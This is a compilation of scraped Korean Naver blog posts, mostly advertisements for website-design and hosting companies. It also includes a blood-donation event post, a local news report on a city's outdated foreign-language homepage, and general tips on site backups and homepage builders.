가지로 Internet의 일반 파일 업로드 프로토콜Protocol입니다.파일 업로드 프로그램인 FTP를 써서 프로그램 창 왼편에 있는 폴더에 저장된 특정 파일들을 더블클릭 해서 홈페이지 서버로 전송할 수 있습니다. 또한 홈페이지 기획물을 전문기업에 맡겼을 경우에 백업 계약도 약정해 놓으시면 좋은데요. 계약 내용에 지정된 기간마다 백업 문서를 제공받기로 명시해 둔다면파일과 소스를 안전하게 보장받을 수 있기 때문입니다.  디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다.한 획의 글자, 하나의 점에도 고심하여 제작하고 있으며 소비자가 사용하기 편하고업체를 각인할 수 있는 효율적인 디자인을 지향하고 있습니다.    마케팅적 지식과 디자인적 노하우로 만족도 높은 디자인을 제작해 드리겠습니다. 홈페이지제작및관리에 대해 알아봤는데요!모르고 있던 사실을 새로이 알고, 아는 것의 즐거움을 느끼게 하는 유용한 포스팅이 됐기를 바라요^^더 귀중한 정보~ 확인하고 싶으시다면 또 찾아주시고,이웃 추가도 부탁 드려요~네이버 블로그는 맞지만, 확인불가 인강홈페이지 솔루션 호스팅전문 교육닷넷 입니다.교육닷넷 인강 홈페이지 솔루션에는...지사 또는 프렌차이즈 가맹점 등의 파트너 운영관리 기능도 함께 포함되어 있습니다.즉, 본사에서 홈페이지 전체 관리를 진행하고, 지사 또는 프랜차이즈 가맹점 등은 홍보 및 영업 마케팅을중점적으로 진행하면서 판매되는 상품에 대해서 %(비율제)로 수익쉐어 하는 기능이 추가 되어 있습니다.기본적으로 사업자 파트너와 개인 파트너로 구분하여 운영관리 가능합니다.수수료 및 세금관련 건 등을 구분설정하는 기능 등 간편하게 설정만으로 파트너쉽을 맺고 운영관리 판매 홍보 등다양하게 활용할 수 있는 솔루션이기 때문에....지사 가맹점 프랜차이즈 등의 컨텐츠 서비스 운영관리 홍보판매 등을 하시는 업체들에게 아주 좋은 이러닝솔루션 이지요!더 자세한 문의는? 교육닷넷 운영자 휴대폰 (010-xxxx-1497)에 전화주시면 상세하게 안내 및 상담 해드리겠습니다.교육닷넷 http://www.kyo6.net교육닷넷 인강 홈페이지 이러닝솔루션✔교육닷넷,이러닝,인강사이트,동영상홈페이지,강의사이트구축,홈페이지제작,이러닝툴,이런툴,인강홈페이지,인강사이트제작,동영상강의사이트제작,인...www.kyo6.net  혹시 "시지온"이라는 기업에 대해서 들어보셨나요? 아마 대부분은 들어본적이 없다라고 하실 겁니다. 하지만 "라이브리"라고 얘기하면 아시는 분들이 꽤 나오실 거고요. 만약 UI까지 같이 보여주면 십중팔구는 본적이 있다라고 얘기하실 거라고 생각합니다. 왜냐하면 시지온 라이브리는 SNS 로그인으로 댓글을 달 수 있는 국내 최초, 최대 소셜 댓글 서비스이기 때문이죠.   2019년 10월 3일 기준으로 라이브리가 설치된 사이트는 43,180개, 누적 사용자는 31,324,995명, 고객사는 1,258개, 누적 댓글은 35,564,786개라고 하니 얼마나 서비스 규모가 큰지 짐작할 수 있습니다. 이외에도 다양한 사업을 성공적으로 진행하고 있을 정도로 앞으로 성장 가능성이 높은 기술 기반의 스타트업이라고 할 수 있죠.   이렇게 규모가 커진 건 그만한 이유가 있었는데요. 편리한 소셜 로그인, 간편한 사진/동영상 첨부, 모바일 최적화, 관리자 페이지, 데이터 분석과 같은 기능을 제공하면서 티스토리 플러그인 및 개인 홈페이지를 위한 무료 버전과 타뷰라 광고 수익 창출이라는 차별점 덕분에 사용자가 지속적으로 확대되었습니다.     여담이지만 시지온은 커뮤니케이션이 문명을 이끈다고 생각했기 때문에 시빌라이제이션(문명)이라는 영어 단어에서 모티브를 땄다고 하는데요. 네티즌들의 건전한 댓글문화를 정착시키면서 기업 입장에서 효율적인 댓글관리를 할 수 있게 라이브리 시스템을 만들었다고 합니다. 제가 좋아하는 문명 게임에서 착안했다고 하니 뭔가 동질감 같은 게 들더라고요.    그래서 초창기 라이브리는 소셜댓글을 지속적으로 고도화하는 방향으로 개선되었다고 하는데요. 익명성을 앞세운 악플이 상당 부분 없어진 것도 상당 부분 공헌했다고 볼 수 있습니다.    실제 효과가 있었기 때문에 삼성전자, LG전자, KT, SK텔레콤, KBS, SBS, MBC 같은 곳에서도 국내 굴지 기업과 메이저 매체에서도 라이브리를 사용하지 않았나 싶네요. 또한 2018년 제 1회 국가경쟁력대상에서 개인 부문 앙트러프러너십을 수상한 이력을 갖고 있습니다. 지금은 소셜 빅데이터 분석 엔진을 개발 중이고 미국, 중국 등 글로벌 시장 진출을 추진 중입니다.   그렇다면 시지온의 라이브리 소셜 댓글 서비스는 어떠한 특징을 갖고 있을까요? 시티 버전은 누구나 무료로 사용 가능한, 기본에 충실한 버전이라고 보면 됩니다. 소셜댓글, 관리, 통계 기능을 사용 가능하면서 무료로 쓸 수 있죠. 반면 프리미엄 버전은 디자인 변경, 기술지원, 프리미엄 컨설팅이 포함되어 있어 기업에 최적화된 유료 버전이라고 볼 수 있습니다.   웹사이트와 소셜미디어를 연결해 소통/관리/분석을 편리하게 만들어 주는 SNS 통합 연동 솔루션인 만큼 소비자의 소통측면에서 기업 홈페이지나 블로그에서 흔히 볼 수 있고요. 지난 2017년 11월 20일부터 라이브리 시티 서비스를 이용하는 사용자 대상으로 광고 서비스를 적용하면서 많은 사용자들이 관심을 가지게 되었습니다.   시지온에서 서비스 중인 또 다른 플랫폼으로 어트랙트가 있는데요. 쉽게 얘기해서 인스타그램 디스플레이 및 커머스 솔루션이라고 보면 됩니다. 라이브리가 일종의 소셜댓글 서비스라면 어트랙트는 일종의 후기 개념으로 올린 고객들의 사진을 끌어와서 웹사이트에 노출하는 방식이죠. 유저들이 자발적으로 콘텐츠를 많이 생산하는 아이템이라면 효과적인 마케팅 툴이 될 수 있다고 합니다. ​어떻게 보면 전혀 연관성이 없어 보이는 서비스처럼 보이지만 시지온이 철학으로 내세우고 있는 3가지 키워드인 리액션, 빅데이터, 테크 측면에서 보면 일맥상통하는 측면이 충분히 있는 것 같네요. 우리가 흔히 리액션이라고 불리는 양방향 커뮤니케이션을 빅데이터로 삼고 이를 테크로 승화시켜서 많은 가치를 창출할 수 있게 연결해 주는 곳이 바로 시지온이라고 보면 될듯합니다.   ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 당신만을 위한 브랜딩이 필요하신가요?​로고 디자인부터 명함 · 홈페이지 제작페이스 북 · 인스타 · 블로그 관리까지​-​온라인 · 오프라인 전문 마케팅사 AllMap​과 가치를 높여보세요  ​​온라인을 기반으로 한 소비자의 수요가지속적으로 증가함에 따라업체에서는 판매하고 있는 상품과 서비스를 안내할 수 있는 기본적인 시스템 구축 뿐 아니라각종 SNS를 활용하여 좀 더 능동적으로 공격적인 마케팅을 할 필요성이 늘어나고 있습니다.​그러기 위해서는 본인이 운영하는 사업체에 대해 알릴 수 있는 기본 시스템,즉, 청주홈페이지제작이 선행되어야 하는데​소비자의 니즈를 충족시켜 소비로 이끌어 낼 수 있는 상품의 정보와 서비스,혹은 기업 가치가 이 안에 내재되어야 합니다. ​   눈으로 보지 않고, 귀로 듣지 않고, 입으로 맛보지 아니하며,코로 냄새를 맡지도, 손으로 만지지도,​그럼에도 불구하고 소비자의 상상력을 동원해 오감을 만족시킬 수 있는 ​식당 · 펜션 홈페이지 & 의류 쇼핑몰서비스에 가치를 담는 기업홈페이지​-​전문성을 담아 신뢰를 드리는 병원홈페이지​​올맵에서는 디자인에 기업의 색을 담아 청주홈페이지제작을 진행하고 있습니다  ​  계획 수립 단계에서 클라이언트와의 미팅을 통해  원하는 방향성에 대한 의견을 조율한 뒤  기능을 설계하고 기업이 추구하는 이미지와 이념에  매칭될 수 있는 디자인을 입혀내게 됩니다. 화면 상단 혹은 측면에 사용자가 자주 찾는정보에 대한 카테고리 배치를 따로 설정할 수 있으며원하는 정보에 빠른 접근이 용이할 수 있도록통합검색 기능 추가, 반응형 웹 기술을 적용함으로서 PC와 태블릿, 스마트폰 등 다양한 기기에서 최적화 된 화면으로 Homepage 확인이 가능하도록청주홈페이지제작을 지원해드리고 있습니다.    같은 업체인 듯 다른 업체인 듯 어디서 본 것 같은 홈페이지? ​N O ! ​같은 레이아웃에 사진만 바꿔 찍어내는 획일화된 디자인이 아닙니다 ​ 감성을 담아, 가치를 담아 홈페이지에 고유의 색을 담아드립니다      클라이언트의 수 많은 피드백을 거쳐 결과물이 완성되는 홈페이지를 제작할 때는처음부터 방향성을 잡아줄 수 있는 전문 업체와의 만남이 무엇보다 중요합니다. ​병원 홈페이지부터 레스토랑,  관공서와 기관까지 그간 쌓아온 수 많은 경험으로 ​Homepage 기획 · 제작부터 페이스북과 인스타, 네이버 등 각종 SNS채널을 이용한 온라인 마케팅, 현수막과 배너, 리플릿과 브로슈어 등 출력물을 통한 오프라인 광고까지 클라이언트에게 지속적인 코멘트로 피드백을 드리고 있으며​기업의 정체성을 시각적으로 살리고가치를 높일 수 있는심볼 로고 제작 또한 가능합니다.​청주홈페이지제작 고민된다면 올맵과 상담하세요 :)​  WHY, AllMap? ​ 온 · 오프라인 전문 광고 기획사 -기획부터 제작 · 홍보 마케팅까지  잠재 소비자들이 많이 사용하는 검색엔진과SNS를 활용한 광고 또한 가능합니다.​불특정 다수가 활동하는 플랫폼을 활용하여주 타겟층이 되는 연령대를 선정,보다 효율적이고 경제적인 마케팅 비용으로 잠재수요를 끌어 올림으로서귀사의 매출증가가 이루어지도록 도와드립니다.​청주홈페이지제작 · 인스타광고 · 페이스북광고명함제작 · 브로슈어 · 브랜드블로그관리까지​온오프라인 통합 마케팅이 필요하다면언제든 문의주세요 :)​​ 올맵 제작 홈페이지 포트폴리오HOMEPAGE PORTFOLIO 홈페이지 제작 · 기획부터 디자인까지 #병원홈페이지제작 #가구점홈...blog.naver.com ​  올맵충청북도 청주시 흥덕구 사운로404번길 64 세상의 모든 마케팅 올맵 ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가https://blog.naver.com/blood_info/222350788556 조혈모세포와 함께하는 헌혈퀴즈 이벤트, 퀴즈 풀고 상품 받아 가세요~안녕하세요. 혈액관리본부입니다. 혈액관리본부에서 조혈모세포와 함께하는 헌혈퀴즈 이벤트를 진행합니다~...blog.naver.com  '조혈모세포와 함께하는 헌혈퀴즈 이벤트'가 5월에도 있네요. 이번에도 당첨자 100명을 선정해서 조혈모세포 스페셜 목쿠션을 선물로 주는 이벤트입니다. 참여 방법은 3월, 4월 이벤트와 같아서 간단하게 쓰겠습니다. 방법은 위의 혈액관리본부 네이버 블로그 링크 주소로 들어가신 다음, 블로그 글에 있는 네이버 폼으로 들어가셔서 2문제를 풀고 이름과 연락처, 주소를 남기시면 참여 가능합니다.​  문제는 헌혈과 조혈모세포 등과 관련된 내용이고, 강력한 힌트를 알려주는 링크 주소로 접속하시면 답을 금방 알 수 있어서 쉽습니다. 또한 네이버 폼에 올해 헌혈을 했다는 걸 알려주는 사진이나 조혈모세포를 신청했다는 인증샷을 남길 수 있는 칸이 따로 있습니다. 조혈모세포 등록증을 인증한다면 뒷면을 사진으로 찍어야 하고, 헌혈증서는 이름과 헌혈일자가 보이는 앞면을 사진으로 찍어야 합니다. 그 밖에 헌혈하고 있는 사진을 업로드해도 무방합니다.​  이벤트 기간: 5월 14일 금요일 ~ 5월 20일 목요일  당첨자 발표 날짜: 5월 26일 수요일(대한적십자사 혈액관리본부 페이스북에 발표됩니다.)​ ​   필자의 경우 3월 이벤트에는 당첨되었고, 4월 이벤트에는 떨어졌습니다. 금방 참여할 수 있어서 이번에도 응모해봤습니다.​  다음은 혈액관리본부 홈페이지를 통해 볼 수 있는 두 가지 이벤트를 살펴보겠습니다.​   우선 서울동부혈액원 광역권에서 헌혈자를 대상으로 진행하는 이벤트가 있습니다. 세계헌혈자의 날인 6월 14일을 기념하기 위해 총 614명에게 '설빙'에서 쓸 수 있는 모바일 기프티콘을 주는 이벤트입니다. 다만 전혈과 혈소판 헌혈자에 한해서 참여 가능합니다.​ 이벤트 기간: 5월 13일 목요일 ~ 6월 30일 수요일  당첨자 발표 날짜: 7월 13일 화요일(혈액관리본부 홈페이지를 통해 발표됩니다.)  참여방법: 이벤트 기간 내에 헌혈하고 혈액관리본부 홈페이지에서 응모하면 됩니다.  참여제한: 서울동부혈액원 헌혈의집/헌혈버스의 전혈, 혈소판 헌혈자만 참여 가능합니다.​​ ​  마지막으로 혈액관리본부 홈페이지를 통해 매달 나오는 라식수술 이벤트에 대해살펴보겠습니다. 단 2명에게만 무료라식수술권을 지원하는 이벤트로 1달 주기로 열려서 오랫동안 이어진 이벤트이기도 합니다. 무료라식수술권은 가족에게 양도할 수 있습니다. 다만 라식수술이외의 검사 비용과 서울에 위치한 이안안과로 가는 교통비는 개인이 해결해야 합니다. 필자도 계속 응모하고 있지만 아직 당첨된 적은 없습니다.​ 이벤트 기간: 5월 6일 목요일 ~ 5월 31일 월요일  당첨자 발표 날짜: 6월 8일 화요일(혈액관리본부 홈페이지를 통해 발표됩니다.)  참여방법: 5월에 헌혈하고 혈액관리본부 홈페이지에서 응모하면 됩니다.  참여제한: 누적 헌혈횟수가 30회 이상인 헌혈자에 한합니다.(대한적십자사에서의 헌혈실적만 포함됩니다.) 안녕하세요 병원홈페이지제작업체 병원사랑넷입니다.^^병원홈페이지 제작을 통해 온라인 마케팅을 시작하려는 많은 병원들이 신규 구축을 하거나 새롭게 리뉴얼을 많이 하고 계신데요 어디서 제작을 해야할지 알아보고 비교해보면서 업체선정을 신중하게 하고 계실텐데요.고민하지 않아도 되는 병원사랑넷에서 맘 편히 제작을 결정해보는건 어떠실까요?  20년 이상 홈페이지 제작을 해오고 있는 오랜 제작 경험과 경험속에서 합리적이고 거품을 뺀 33만원의 가성비 넘치는 제작비용과 월 22,000원의 운영비를 통해 부담없이 제작과 운영을 할 수 있고 10년 이상 경력을 가진 디자이너들이 만들어내는 다양한 디자인을 통해 홈페이지 제작을 할 수 있어 퀄리티까지 보장 받는 병원사랑넷입니다. ^^ 병원사랑넷은 병원홈페이지를 이용하는 사용자들과 홈페이지를 관리하는 관리자 두 영역의 니즈를 모두 갖추기 위해 노력하며 병원홈페이지제작을 진행하고 있습니다. 사용자와 관리자 모두 어디서든 자유롭게 홈페이지를 사용할수 있고 관리 할 수 있도록 반응형 기반의 적응형 홈페이지로 제작을 하고 있어 PC / 스마트폰 태블릿 어디서든 홈페이지 사용이 자유롭습니다 :D 병원홈페이지의 겉모습을 사용자가 본다면 관리자는 그 이면의 관리적인 측면을 더 볼 수 밖에 없는 입장입니다. 병원사랑넷은 누구나 쉽고 편하게 관리 할 수 있도록 다양한 관리 시스템을 제공하고 있습니다. 홈페이지의 각종 메뉴와 이미지 및 텍스트를 자유롭게 수정할 수 있는 셀프 수정 시스템을 적용하였고 다루는 방법도 한글 또는 파워포인트(PPT)를 사용하듯이 익숙한 인터페이스로 운영되고 있어 거부감없이 관리가 가능합니다. 홈페이지에 팝업 서비스가 홈페이지의 역동성을 많이 보여줄 수 있는 기능중 하나인데 팝업도 수많은 팝업 샘플선택과 간단한 문구 수정만 하면 팝업이 자동으로 만들어지기 때문에 별도의 디자이너가 필요 없어도 팝업관리가 가능한 병원사랑넷입니다. ^^ 이 밖에도 홈페이지 제작을 위한 첫 시작인 자료수집을 부담없이 할 수 있도록  웹하드 시스템으로 제작자료 준비가 어렵지 않습니다.홈페이지 회원관리를 레벨과 그룹기능 회원가입양식, 약관설정, 알림기능 등 회원관리를 위한 다양한 기능이 준비되어 있습니다. 홈페이지 관리시 부담없는 수정을 할 수 있도록 자동복구기능이 관리의 킥이라 할 수 있죠! 병원사랑넷은 병원홈페이지제작만해도 병원 진료 온라인 예약 시스템이 무료로 제공되는다는 사실을 아시나요?비대면이 주목받는 현 시대에 필요한 부가 서비스인데 별도의 비용 없이 기본으로 제공되고 있습니다. 담당의사관리부터 예약인원설정 등 실제 운영에 필요한 다양한 기능들이 적용되어 온라인 예약까지 병원사랑넷 홈페이지제작시 운영이 가능합니다. :) 병원 트렌드와 IT트렌드를 모두 유심히 읽고 체크하고 있는 병원사랑넷은 항상 시대가 원하는 시스템으로 제공하기 위해 노력하고 있습니다.이미 수년전부터 플래시가 없는 시스템으로 변경되어 병원사랑넷으로 홈페이지 제작하고 있는 곳은 2021년 초 플래시 사용중단으로 인한 이슈에 아무런 문제가 없었습니다. :D 병원홈페이지제작을 위해 이제 고민하지마시고 병원사랑넷으로 제작을 진행해보세요.효과적이면서 사용자와 관리자 모두 만족할 수 있는 병원홈페이지를 만나볼 수 있습니다.  병원사랑넷병원 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.medi-love.net ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가​ 1인 기업 시대, 자기 PR시대다양하고 복잡한 만큼 존재 어필을 위한 노력이 필요한 현대사회를 보여주는 말인 것 같은데요.사업체부터 프리랜서, 1인 미디어 등 다양한 활동을 이끌어 가시는 분들은 더욱 공감하는 말일 것 같아요. ​특히나 온 오프라인 경계없이 광범위한 활동이 필수가 된 요즘자신의 사업이나 채널 등을 차별성 있고 명확하게 어필하기 위한 홈페이지의 필요성 또한 커지는 것 같아요.​그런데 내맘에 쏙 드는 홈페이지 만드는 게 생각보다 간편한 일도, 적은 금액이 드는 일도 아니잖아요?오늘은 그런 고민을 가지고 계실 분들에게 좋은 정보가 있어서 소개해드리고자 합니다. ​전문 디자이너를 통해 나에게 맞춘 홈페이지를 만드는 방법 '바른웹'을 소개 합니다. ​ 전문 디자이너의 손길을 거친 나만의 홈페이지를손 쉽게 만들고 관리 하고 싶다면, 바른웹​사실 홈페이지가 우리 일상에 이미 익숙한 매체이기 때문에 그만큼 만드는 방법도 많이 알려졌고찾아보면 탬플릿 형식으로 누르라는 대로 클릭 몇번만 하면 쉽게 만들 수 있는 방법도 있습니다. ​그런데 사실 쉽게 만들 수 있는 만큼, 왠지 흔한 것 같고 눈에 띄지 않는건 기분 탓일까요? :)​위에서 언급했듯 자기 PR을 위해 만든 홈페이지인데 어디선가 본 것 같은  느낌이라면 당연히 쉽게 잊혀질 확률이 커질 수 밖에 없겠죠? ​바른웹은 전문 디자이너가 직접 디자인해준다는 점에서 이런 걱정을 해소해 줄 수 있을 것 같아요.​ ​바른웹에서는 PC홈페이지, 모바일 홈페이지, 이 두가지를 모두 소화하는 반응형 홈페이지까지5년 계약 관리 계약 기준, 월 3만원 관리비로 제작과 관리 두 마리 토끼를 동시에 잡을 수 있다고 해요.​보통 타사에서 13페이지 기준 홈페이지를 만들때 약 130만원 정도가 든다고 하는데요바른웹에서는 무료로 제작할 수 있습니다. ​또한 요즘 홈페이지를 PC로만 들어가지 않잖아요?1인 1스마트폰 시대 답게 모바일 접속도 신경쓰셔야 하는데,이 부분에 대한 걱정도 역시 No!타사 기준 맞춤형 모바일 4페이지 제작 기준 약 80만원 정도 드는 모바일 홈페이지도 바른웹에서는 무료로 진행할 수 있습니다. ​모바일 환경에서도 PC에서도 같은 홈페이지만 충돌 없이 편하게 이용 가능한 반응형 홈페이지 제작!타사 8페이지 제작 기준 약 300만원정도 드는 작업도 바른웹에서는 무료로 진행됩니다. ​ 돈내는 기간만 내 홈페이지인 임대형 홈페이지?완전한 나의 소유, 독립형 홈페이지!바른웹을 통해 제작하는 홈페이지가 맘에 들었던 두번째 이유는 돈내는 기간동안만 빌려서 쓰는 임대형 홈페이지가 아닌 소유권을 의뢰인에게 주는 독립형 홈페이지라는 점이었습니다. ​계속 소유권을 유지하기 위해서는 계약연장을 통해 지속적인 비용이 들 수 밖에 없는데요. 소유권이 처음부터 의뢰인에게 주어지기 때문에 비용 절감이 되기 때문이죠!​앞에서 5년 관리계약 기준 3만원씩 관리비를 내면 총 비용이 180만원 정도 발생한다고 소개했는데요.​계약 기간 5년 이후엔 비용이 발생하지 않으면서, 소유권도 얻고, 임의 수정도 가능한데도타사의 임대형 홈페이지 비용보다 무려 84%나 효율적인 것을 알 수 있습니다. ​ 7년간 10,00개 이상의 홈페이지를 제작해온 바른웹​마지막으로 바른웹이 마음에 들었던 건 7년간 10,000개 이상의 홈페이지를 제작해온 경험이 풍부한 홈페이지 제작회사라는 점이었습니다.​풍부한 경험에서 나온 노하우를 가진 전문 디자이너에게 월 3만원의 관리비 만으로 홈페이지 제작과 관리를  받을 수 있다면 ! (월 3만원이면 사실 하루에 천원꼴이잖아요? :)​효율성, 전문성, 충분한 관리까지 두루두루 갖춘 홈페이지 제작사 바른웹이라면 가능한 일이더라구요! ​믿을 수 있는 경험과 전문성, 효율성까지 담뿍 담은 홈페이지를 제작해보고 싶으시다면 바른웹과 상담해보세요 ! ​ 무료홈페이지제작※ 월 3만원의 관리비 만으로도 이 모든 혜택이 가능!leaderscpa.com 위 포스팅은 해당업체에서 경제적 대가를 받고 작성된 글입니다. ​#홈페이지제작 #무료홈페이지제작 #반응형홈페이지 #모바일홈페이지 #바른웹 #기업홈페이지 #개인홈페이지 네이버 블로그는 맞지만, 확인불가 <앵커>안양시가 외국인들을 위해 외국어 홈페이지를 운영하고 있는데, 한 달 째 새 소식이 올라오지 않고 있습니다.스마트 창조도시를 내세우고 있는 안양시가홈페이지 하나 제대로 관리하지 못하고 있는 것입니다.김지영 기자가 취재했습니다.<리포트>안양에 살고 있는 나카오카 유미코씨가 안양시 홈페이지를 둘러보고 있습니다.시민들에게 필요한 정보를 영어와 일본어 등4개 국어로 번역해 서비스하고 있기 때문입니다.하지만 지난해 12월 23일 이후부터 새 글이 올라오지 않았습니다.매일 새로운 내용이 올라오는 한국어 홈페이지와는 전혀 딴 판입니다.민원게시판 사용법도 훨씬 복잡합니다.내국인은 이름과 주민등록번호만 입력하면 되지만외국인은 아이디를 만들고 이메일로 인증도 해야합니다. -인터뷰 (INT) : 나카오카 유미코(일본) / 안양시 평촌대로 “실제 생활하면서 궁금한 점 많이 느낍니다. 이럴 때 어디다 물어봐야 할까 할 때 (민원게시판으로) 물어보고 바로 대답이 오면 좋을 것 같습니다. 그런데 번거롭게 가입하고 여러 과정을 거쳐야 하는 건 조금 (불편합니다).”  3년 전 외국어 홈페이지를 만드는데 4300만원을 투입한 안양시.매 번 업데이트 되는 정보를 4개 국어로 번역하기 위해올 해도 1200만원의 예산을 편성했습니다.하지만 아직까지 통역업체를 정하지 못하면서 관리가전혀 되지 않고 있는 상황입니다. -현장녹취(SOV) : 안양시 관계자 (음성변조) 35 29 -“올해(계약은)는 아직 저희가 못했습니다. 오류가 있다고 민원제기 하시는 분들도 있고해서… (전문 번역센터에 맡기고 싶어도) 자치단체에서는 그런 곳에 의뢰할 수 있는 수준이 아니에요. 가격이 5배 이상 비싸니까.”  시민들에게 다양한 정보와 도움을 주는 지자체 홈페이지.하지만 외국인을 위한 배려는 부족하기만 합니다.-스탠드 업(S/U) : 김지영기자 jykim88@tbroad.com“2013년 12월말 기준으로 안양에 살고 있는 외국인은 6800여명.이들과 소통하기 위해서는 보다 진정성 있는 노력이 필요해 보입니다.티브로드뉴스 김지영입니다.” 영상취재 : 김민상<김지영기자 jykim@tbroad.com> 네이버 블로그는 맞지만, 확인불가홈페이지제작및관리 간편정보홈페이지 백업, A-Z까지 알아보자!무언갈 완전하게 배웠다고 생각했을 때각도를 조금만 돌려 보면 전혀 몰랐던 새로운 모습을 발견하게 됩니다.실상 알고 있는 몇 가지에 사로 잡혀  놓치고 있는 것들이 많죠. 그럼 지금부터 홈페이지제작및관리에 대한 명확하고 구체적인 정보 알려드릴게요!어느 정도 스케일이 있는 웹호스팅 기업은 자체 백업 프로세스가 있으므로업체 채택 시 잊지마시기 바라며홈페이지가 해킹되어 문제가 발견되었을 상황이라면 백업 파일을 불러와 복구가 가능합니다.따라서 웹사이트를 관리 하신다면 백업은 꼭 정기적으로 진행되어야 합니다.홈페이지 제작 완료 후 부족한 부분을 보완하다 보면 수정한 부분이 마음에 들지 않아 원래의 상태로 되돌아가고 싶은 경우가 있기 때문에 반드시 백업을 해두는 것이 좋습니다.홈페이지 기획물을 업체에 맡겼을 때에 백업 계약도 약정해 놓으시면 좋은데요.계약 내용 상에 지속적인 기간마다 백업 파일을 제공받기로 명시해 둔다면파일과 소스를 안전하게 보장받을 수 있기 때문입니다.홈페이지 관리 중 컨텐츠나 페이지를 부주의로 지웠을 상황을 대비해홈페이지를 확실하게 백업해 두었다면 자유롭게 원상복구가 가능합니다.꼭 알아둬야 할 홈페이지 빌더에 대해!홈페이지 빌더는 기본적으로 제공되는 레이아웃을 통해서 사용자가 만들고 싶은대로 홈페이지를 제작할 수 있는 방식을 말합니다.그리고, 사용자가 폰트나 이미지의 위치, 크기, 메뉴와 게시판 등을 조절할 수 있어홈페이지를 다양하고 자유롭게 디자인할 수 있다는 장점을 가지고 있습니다.맞춤형과 템플릿형 홈페이지의 장단점을 섞은 방식이 바로 홈페이지 빌더입니다.완성도 있는 디자인으로 부담되지 않은 비용으로 홈페이지를 제작할 수 있기 때문인데요.최근에는 새로운 디자인의 레이아웃을 제공하는 업체들이 많아졌고,직접 만든 스킨을 적용할 수도 있어, 고급스러운 홈페이지 제작도 가능해졌습니다.특히 디자인 능력이나 프로그래밍 지식이 있지 않아도 홈페이지를 어렵지 않게 만들 수 있는데요.홈페이지 빌더를 사용한다면 기본적으로 제공되는 홈페이지 디자인에서사용자가 알아서 사진이나 내용을 수정할 수 있고, 주기적으로 홈페이지를 관리할 수도 있습니다.최근, 다양한 크기의 디바이스들의 등장으로 디스플레이의 종류에 따라 화면 크기가 자동으로 조절되는 반응형 홈페이지 빌더가 생성되었습니다.반응형 홈페이지 빌더를 이용하면, 하나의 홈페이지를 제작하여모바일이나 PC, 태블릿 등 모든 기기에서 최적의 사이즈와 해상도로 구현할 수 있습니다.홈페이지 빌더는 짧은 기간에 쉽고 저렴하게 홈페이지를 만들 수 있는 서비스입니다.본인이 원하는 디자인의 홈페이지 스킨을 고른 뒤 카테고리나 내용, 사진 등을 간단하게 수정하면즉각적으로 사용이 가능한 홈페이지를 만들 수 있습니다.온라인 창업에 반드시 필요한, 홈페이지! 만들긴 만들었는데, 관리가 어렵다고요?홈페이지 제작에서 사후관리, 유지보수, 마케팅까지 토탈로 해결해 드리는 다브가 모두 책임지겠습니다!다브는 홈페이지 제작 외에도 관리자 모드를 설치, 업데이트 또는 수정사항을 고객님 스스로설정할 수 있어 관리비 금액 부담이 없습니다. 또한, 제작비 무료! 호스팅 비용만으로모바일 홈페이지까지 동시에 제작할 수 있는 알찬 혜택도 제공하는데요.또한 다국어 시스템이 구성된 자동 번역 쇼핑몰 홈페이지도 제작, 해외에서 효과적인 쇼핑몰 솔루션으로 가성비 최고치를 자랑합니다.홈페이지 설치 후 컴퓨터에 대해 아무것도 모르는 고객도,마케팅 솔루션을 알고 싶은 고객도 다브와 함께라면 전혀 문제 없습니다. 지금 문의하세요!착한 가격으로 쉽고 빠르게 홈페이지, 쇼핑몰 제작제가 드린 홈페이지제작및관리에 관한 정보에서 문제의 실마리를 찾으셨나요?혹시 모자란 정보는 없었나요?아직 정확한 해답을 찾지 못한 분들이 계신다면 알짜 정보를 찾아다시 다시 포스팅할게요!. 조금만 기다려 주세요~!!네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가잘 모르는 자영업자분들이나 기업 오너, IT에 문외한인 업종이라 홈페이지 제작 관련으로 필요는 한데 어떻게 해야 할지 모르겠다면 아래 글을 자세히 살펴보세요. 무료 제작이 중요한 게 아닙니다. 관리가 더 중요해요. 문외한인 분들을 기준으로 알려드립니다. ​ <홈페이지 제작 무료보다 중요한 관리> 개인이라면 굳이 돈 들여서 할 필요가 없습니다. 그럼에도 불구하고 완전 무료로 홈페이지 제작은 불가능합니다. 최소한 내 홈페이지 주소는 만들어야 하니까요. 인터넷 공간에서 많은 돈이 움직이다 보니 사업하시는 분들은 무조건 웹사이트를 만들어두어야 합니다. ​ 홈페이지 제작에 필요한 것들 웹사이트를 정식으로 만들려면 주소가 있어야 합니다. 네이버가 www.naver.com의 주소를 가지고 있듯이 말이죠. 이걸 도메인이라고 합니다. 그리고, 웹사이트를 돌아가게 할 장비(서버)가 있어야 합니다. 대부분은 이걸 업체에 맡기게 되고, 그걸 호스팅 업체라고 합니다. ​저도 워드프레스를 활용한 개인 웹사이트를 운영하고 있습니다. 몇 년 치 도메인 비용을 지불했고, 호스팅 비용은 년 단위로 결제하고 있습니다. 개인 서버를 구축할 수 있는 능력자들은 집에서 서버를 운영하기도 하지만, 사실 관리적인 측면의 번거로움 때문에 전문 업체를 대부분 이용하지요.​저처럼 간단하게 홈페이지를 만들 수 있게 해주는 플랫폼이 여럿 있습니다. 직접 세팅해서 만드는 경우도 많고요. 의뢰자 입장에서는 얼마나 예쁘게, 얼마나 효용성 있게 만드느냐가 관건이겠지요. 홈페이지 제작에 대해 꼭 알아야 할 것들 홈페이지 제작은 전문가들 입장에선 난이도가 높지 않습니다. 단, 그 안에 특정 기능들이 들어가야 하는 경우라면 작업 시간이 길게 필요할 수 있지요. (이 글을 보는 대부분은 관련이 없을 거라 생각합니다.) ​그저 무료 제작만 생각한다면 직접 하거나, 주변에 할 수 있는 사람에게 약간의 용돈을 주고 부탁하는 게 좋습니다. 단, 이 정도의 비용이라면 단지 내 가게, 내 회사 등을 간단히 소개하는 정도의 존재감을 위한 웹사이트 수준에서 그칠 